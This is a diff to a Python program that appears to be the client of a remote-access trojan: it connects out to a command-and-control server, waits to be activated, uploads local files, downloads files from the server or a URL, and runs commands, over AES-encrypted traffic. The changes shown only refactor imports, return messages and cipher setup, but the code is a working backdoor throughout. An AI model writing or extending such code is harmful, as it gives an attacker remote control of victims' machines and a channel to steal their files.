@@ -1,6 +1,10 @@
 #!/usr/bin/env python3
 
-import subprocess, socket,  time, os, sys
+import os
+import sys
+import time
+import socket
+import subprocess
 from urllib.request import urlopen
 from common import pr, clear, get_cipher
 from common import Encode, Decode, Send, Receive
@@ -15,8 +19,7 @@ def Upload(sock, file):
   try:
     f = open(file, 'rb')
   except IOError:
-    pr('Error opening file.')
-    return
+    return 'Error opening file.'
 
   while True:
     d = f.read()
@@ -25,18 +28,19 @@ def Upload(sock, file):
     Send(sock, d, '')
 
   f.close()
+  return 'File sent'
 
 # receive from CnC
-def Download(sock, filename):
+def Download(sock, file):
   try:
-    f = open(filename, 'wb')
+    f = open(file, 'wb')
   except IOError:
-    pr('Error opening file.')
-    return
+    return 'Error opening file.'
 
   d = Receive(sock)
   f.write(d)
   f.close()
+  return 'File received'
 
 # download from url (unencrypted)
 def Downhttp(sock, url):
@@ -44,7 +48,7 @@ def Downhttp(sock, url):
   filename = url.split('/')[-1].split('#')[0].split('?')[0]
   g = open(filename, 'wb')
   # download file
-  u = urllib2.urlopen(url)
+  u = urlopen(url)
   g.write(u.read())
   g.close()
   # let server know we're done...
@@ -96,11 +100,11 @@ def Exec(cmde):
 # main loop
 while True:
   try:
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    from socket import AF_INET, SOCK_STREAM
+    s = socket.socket(AF_INET, SOCK_STREAM)
     s.connect((HOST, PORT))
 
-    # create a cipher object using the random secret
-    cipher = AES.new(secret,AES.MODE_CFB,'0000000000000000')
+    cipher = get_cipher()
 
     # waiting to be activated...
     data = Receive(s)
